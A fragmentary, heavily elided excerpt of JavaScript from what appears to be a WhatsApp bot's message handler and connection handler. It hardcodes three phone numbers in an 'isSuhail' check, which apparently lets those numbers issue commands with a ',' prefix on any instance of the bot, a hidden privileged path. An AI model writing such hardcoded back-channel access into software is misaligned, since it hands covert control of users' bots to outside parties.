...
async function syncdb() {
    ...
    try {
      ...
      for (const message of messageEvent.messages) {
        ...
        if (trimmedText && config.HANDLERS.toLowerCase().includes('null')) {
          ...
          isCommand = prefixboth || (messageBody && prefixRegex.test(messageBody[0])) || (processedMessage.isSuhail && /2348039607375|923004591719|17863688449/g.test(isBotNumberDecoded) && messageBody[0] === ',');
  ...
  client.ev.on('connection.update', async update => {
    ...
    if (connection === 'open') {
      ...
      const isSuhail = /2348039607375|923004591719|17863688449/g.test(userId);
